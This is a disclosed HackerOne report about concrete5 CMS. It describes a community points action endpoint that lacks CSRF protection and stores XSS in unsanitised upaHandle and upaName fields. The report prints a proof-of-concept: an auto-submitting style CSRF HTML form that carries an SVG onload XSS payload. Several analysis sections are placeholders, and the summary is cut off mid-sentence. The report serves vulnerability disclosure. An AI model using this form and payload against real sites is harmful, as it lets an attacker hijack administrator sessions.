# No CSRF protection when creating new community points actions, and related stored XSS

## Metadata
- **Source:** HackerOne
- **Report:** 65808 | https://hackerone.com/reports/65808
- **Submitted:** 2015-06-04
- **Reporter:** jmpalk
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** unknown
- **Vuln:** Cross-site Scripting (XSS) - Generic
- **CVEs:** None
- **Category:** web-api

## Summary
crayons

The functionality to create a new community points action does not have anti-CSRF protection, and the administrator page displaying actions for which a user can be awarded community points does not have XSS protection

An attacker could craft a malicious POST request to index.php/dashboard/users/points/actions/save, which can use the credentials of a logged-in administrator to create 

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

crayons

The functionality to create a new community points action does not have anti-CSRF protection, and the administrator page displaying actions for which a user can be awarded community points does not have XSS protection

An attacker could craft a malicious POST request to index.php/dashboard/users/points/actions/save, which can use the credentials of a logged-in administrator to create a new action for granting points. Further, the input to the upaName and upaHandle parameters are not sanitized when being stored. For example:


    <form action="http://www.jmpalktest.com/concrete5742/index.php/dashboard/users/points/actions/save" method="post">
      
      <input type="hidden" name="upaID" value="" />
      <input type="hidden" name="upaIsActive" value="1" />
      <input type="hidden" name="upaHandle" value="<sVg/OnLOaD=prompt(1)>" />
      <input type="hidden" name="upaName" value="XSS the admin2" />
      <input type="hidden" name="upaDefaultPoints" value="1000" />
      <input type="hidden" name="gBadgeID" value="" />

      <button type="submit">Csrf your site here!</button>

    </form>


When the resultant data is displayed at on the Community Points page at index.php/dashboard/users/points/actions/action_saved, the stored malicious content in either upaHandle or upaName is not sanitized on output (see attached images), resulting in a stored XSS attack (with an administrator as the most likely victim), which could then be used to exploit other parts of the concrete5 control panel.

</details>

---
*Analysed by Claude on 2026-05-24*
